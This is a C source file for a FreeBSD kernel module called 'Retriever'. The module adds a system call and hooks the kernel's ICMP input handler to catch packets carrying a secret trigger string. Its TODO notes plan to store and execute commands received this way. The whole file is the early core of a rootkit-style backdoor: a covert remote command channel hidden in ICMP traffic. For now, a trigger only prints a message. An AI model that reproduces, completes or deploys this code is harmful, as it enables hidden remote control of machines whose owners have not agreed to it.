/*
 * Name:
 *      Retriever
 * Description:
 *      A system call module that communicates with controller
 * Usage:
 *      TODO: Add usage here
 * Author:
 *      Hai Lang
 * Date Created:
 *      2013-02-28
 * Last Update:
 *      2013-02-28
 *
 * TODO:
 *      1. Make character device to store received command
 *      2. Make userland app to execute the command
 *
 *
*/

/* General Headers */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>

/* System Call Headers */
#include <sys/syscall.h>
#include <sys/stat.h>

/* Headers For ICMP Hooking To Actively Sending Commands */
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

/* Options */
#define KERNDEBUG 1
#define ICMP_TRIGGER "5L1C3R_TRIGGER_"

/* ICMP Hooking Config */
extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

/* Retriever Implementation Function */
static int retriever(struct thread *td, void *syscall_args)
{
    uprintf("Whatever makes you happy, my master!\n");
    return (0);
}

/* icmp_input_hook - Receive Injected ICMP Packets */
void icmp_input_hook(struct mbuf *m, int off)
{
    struct icmp *icp;
    int hlen = off;

    /* Locate the ICMP message within m */
    m->m_len -= hlen;
    m->m_data += hlen;

    /* Extract the ICMP message */
    icp = mtod(m, struct icmp *);

    /* Restore the message */
    m->m_len += hlen;
    m->m_data -= hlen;

    /* Check if the message has the right trigger */
    if(strstr(icp->icmp_data, ICMP_TRIGGER)) {
        printf("ICMP TRIGGER Received!\n");
    } else {
        /* Call original icmp_input if there's nothing special about the packet */
        icmp_input(m, off);
    }
}

/* Prepare sysent to register the new system call */
static struct sysent retriever_sysent = {
    1, /* Number of arguments */
    retriever /* Implementation Function */
};

/* Define the offset in sysent[] table */
static int offset = NO_SYSCALL;

/* Event Handler Function For The New System Call */
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            #if KERNDEBUG == 1
            uprintf("Retriever Module Loaded!\n");
            #endif
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
            break;
        case MOD_UNLOAD:
            #if KERNDEBUG == 1
            uprintf("Retriever Module Unloaded\n");
            #endif
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return (error);
}

/* Declare and register the system call module */
SYSCALL_MODULE(retriever, &offset, &retriever_sysent, load, NULL);
